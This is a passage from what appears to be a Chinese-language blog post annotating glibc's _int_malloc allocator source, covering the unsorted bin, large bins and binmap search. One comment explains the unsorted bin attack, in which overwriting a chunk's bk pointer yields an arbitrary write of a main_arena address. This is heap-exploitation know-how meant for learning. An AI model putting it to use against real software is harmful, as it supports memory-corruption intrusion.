class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a "small" request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123; </span><br><span class="line">          bck = victim-&gt;bk;<span class="comment">//获取victim后项节点</span></span><br><span class="line">          size = chunksize (victim);<span class="comment">//获取victim的size</span></span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);<span class="comment">//根据size获取指向next chunk的指针</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ) <span class="comment">//判断大小是否大于minsize</span></span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid next size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<span class="comment">//判断nextchunk的prevsize是否为size</span></span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) <span class="comment">//判断bck的前一个chunk是不是victim</span></span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="comment">//判断nextchunk的previnuse位</span></span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="comment">//满足上面的检测后,匹配size,是否在smallbin的范围,注意这里判断的是是否仅有一个chunk在unsortedbin中,bck是头指针的下一个,bck指针是victim后项指针,这里判断bck是否为头指针,接下来判断size与nb+头长度的大小关系,若符合则进入分配阶段</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb; <span class="comment">//减去分配的大小</span></span><br><span class="line">              remainder = chunk_at_offset (victim, nb); <span class="comment">//指向下一个偏移的地方</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<span class="comment">//改写unsortedbin,也就是切割以后的值</span></span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<span class="comment">//形成双向链表</span></span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))<span class="comment">//切割后如果不在smallbin的范围内,则设置largebin的指针</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);<span class="comment">//设置一些标识位,返回指针</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);<span class="comment">//这里则是unsorted bin attack的部分,注意我这个版本的libc源码加入了对bck-&gt;fd的检测,2.28之前的版本应该都没有这个检测的,这里说的是当这个unsortedbin不满足分配的size等条件的时候,将这个堆块从unsorted bin中移除,这里如果覆写了victim的bk指针的话,执行这里的话,会导致将add的值写到victim的bk处,而[add + 0x10] = &amp;victim,即任意合法地址写mainarena + 88的值 </span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//恰好相等的时候直接设置inuse然后返回</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果victim是smallbin的范围,且不符合被切割的条件,则返回给对应的smallbin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//返还给large_bin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;<span class="comment">//unlink</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里是unsorted bin,当没有空闲堆块的时候,进入这里,便利unsortedbins,当unsortedbin中只有一个chunk切大小符合条件时,进行切割,然后return</li>
<li>若不符合,则将其从unsortedbin中移除到相应的smallbin和largebin中,即unsortedbin的攻击原理</li>
<li>若刚好相等,则设置头,然后返回</li>
<li>如果victim是smallbin的范围,且不符合被切割的条件,则返回给对应的smallbin</li>
<li>否则返还给large_bin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 2"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      